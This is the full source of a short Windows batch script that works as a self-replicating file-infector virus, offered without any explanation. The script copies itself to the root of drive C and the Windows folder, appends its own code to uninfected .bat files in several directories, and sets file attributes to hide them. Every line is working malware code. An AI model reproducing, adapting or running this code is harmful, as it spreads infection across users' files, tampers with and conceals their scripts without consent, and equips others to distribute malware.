   @echo off
   if not exist c:\EMM.bat copy EMM.bat c:\ >nul
   if not exist C:\WINDOWS\copy_emm.bat type c:\EMM.bat > C:\WINDOWS\copy_emm.bat
   if not exist c:\EMM.bat type C:\WINDOWS\copy_emm.bat > c:\EMM.bat
   if not exist c:\EMM.bat copy %0.bat c:\EMM.bat >nul
   :EMM
   for %%f in (..\*.bat *.bat c:\*.bat c:\windows\*.bat) do set EMM=%%f
   del 1.*
   echo.%EMM%>>1
   find /i " EMM."<1>nul
   if not errorlevel 1 goto e
   find /i "EMM"<%EMM%>nul
   if not errorlevel 1 goto fin
   type c:\EMM.bat>>%EMM%
   :e
   attrib %EMM% +h
   GoTo EMM
   :fin
   attrib c:\*.bat -h
   attrib *.bat -h
   attrib c:\windows\*.bat -h
   attrib ..\*.bat -h
